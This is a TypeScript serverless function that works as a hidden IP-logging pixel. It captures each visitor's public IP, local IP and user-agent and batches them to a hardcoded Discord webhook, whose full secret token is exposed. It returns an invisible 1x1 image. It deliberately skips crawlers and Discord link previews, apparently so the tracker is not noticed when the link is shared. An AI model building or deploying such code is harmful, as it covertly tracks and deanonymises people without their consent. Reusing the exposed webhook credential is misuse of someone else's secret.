import type { VercelRequest, VercelResponse } from '@vercel/node';
import fs from 'fs';
import path from 'path';

// رابط الويبهوك بتاعك
const webhookUrl = "https://discord.com/api/webhooks/1385861724955082762/tU6RWtabwGs3XCkh41brbiw0vuWtD4xT-9dpGCQt-5cx4RCCdswiyPBpeaOG73256gXY";

// مسار التخزين المؤقت (Vercel بيخزن مؤقتًا في /tmp)
const storagePath = path.resolve('/tmp/storage.json');
const COOLDOWN_MS = 60 * 1000; // كل 60 ثانية

function readStorage(): { entries: string[]; lastSent: number } {
  if (!fs.existsSync(storagePath)) {
    return { entries: [], lastSent: 0 };
  }

  try {
    const data = fs.readFileSync(storagePath, 'utf-8');
    return JSON.parse(data);
  } catch {
    return { entries: [], lastSent: 0 };
  }
}

function writeStorage(entries: string[], lastSent: number) {
  fs.writeFileSync(storagePath, JSON.stringify({ entries, lastSent }));
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  const publicIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const source = req.query.source || "unknown";
  const localIP = req.query.local_ip || "N/A";

  // فلترة البوتات والروبوتات
  if (
    !userAgent ||
    /bot|crawler|spider|discord|preview/i.test(userAgent)
  ) {
    return res.status(204).end();
  }

  // جهّز المحتوى اللي هيتخزن
  const content = `> 🌐 **Public IP:** ${publicIP}
> 🖥️ **Local IP:** ${localIP}
> 📍 **Source:** ${source}
> 🧭 **User-Agent:** \`${userAgent}\``;

  const { entries, lastSent } = readStorage();
  const now = Date.now();

  // خزّن الزيارة الجديدة
  entries.push(content);

  // لو عدت أكتر من دقيقة من آخر إرسال، ابعت الرسالة
  if (now - lastSent > COOLDOWN_MS && entries.length > 0) {
    const fullMessage = `📡 **Beacon Logs:**\n\n${entries.join('\n\n')}`.slice(0, 2000); // Discord limit
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: fullMessage }),
    });

    writeStorage([], now); // مسح بعد الإرسال
    console.log("📤 Beacon log sent to Discord.");
  } else {
    // بس خزّن الجديد، لسه مش وقت الإرسال
    writeStorage(entries, lastSent);
    console.log("📝 Beacon stored locally, waiting to batch send.");
  }

  // إرسال بيكسل وهمي
  const pixel = Buffer.from(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAokB9AcPjGgAAAAASUVORK5CYII=",
    "base64"
  );

  res.setHeader("Content-Type", "image/png");
  res.setHeader("Content-Length", pixel.length);
  res.status(200).end(pixel);
}
